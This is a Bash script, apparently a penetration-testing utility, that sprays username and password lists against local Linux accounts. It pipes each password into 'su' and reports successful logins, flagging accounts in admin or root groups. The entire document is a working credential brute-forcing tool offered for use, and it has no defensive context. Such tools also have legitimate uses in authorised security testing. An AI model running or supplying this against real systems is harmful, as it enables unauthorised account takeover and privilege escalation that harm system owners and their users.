#!/bin/bash

'''
A Bash script for credential spraying on Linux using usernames and passwords with CrackMapExec/NetExec-like syntax.

Usage examples:
- Spray credentials from files: linux_spray.sh -u usernames.txt -p passwords.txt
- Spray a single username with multiple passwords: linux_spray.sh -u "admin" -p passwords.txt
- Spray multiple usernames with a single password: linux_spray.sh -u usernames.txt -p "password123"
- Continue spraying on success: linux_spray.sh -u usernames.txt -p passwords.txt --continue-on-success
'''

usage() {
    echo "Usage: $0 -u usernames -p passwords [--continue-on-success]"
    echo "Either -u or -p can be a filename or a string"
    exit 1
}

continue_on_success=false

while [[ "$1" != "" ]]; do
    case $1 in
        -u ) shift
             usernames="$1"
             ;;
        -p ) shift
             passwords="$1"
             ;;
        --continue-on-success )
             continue_on_success=true
             ;;
        * ) usage
             ;;
    esac
    shift
done

[ -z "$usernames" ] || [ -z "$passwords" ] && usage

if [ -f "$usernames" ]; then
    username_list=$(cat "$usernames")
else
    username_list="$usernames"
fi

if [ -f "$passwords" ]; then
    password_list=$(cat "$passwords")
else
    password_list="$passwords"
fi

IFS=$'\n'
for username in $username_list; do
    for password in $password_list; do
        echo "$password" | su -c "whoami" "$username" &> /dev/null
        if [ $? -eq 0 ]; then
            is_admin=""
            groups=$(groups "$username")
            if echo "$groups" | grep -q -E "\b(root|admin)\b"; then
                is_admin=" (admin!)"
            fi
            echo -e "\e[32mSuccess: $username:$password$is_admin\e[0m"
            if [ "$continue_on_success" = false ]; then
                exit 0
            fi
        else
            echo -e "\e[31mFailed: $username:$password\e[0m"
        fi
    done
done
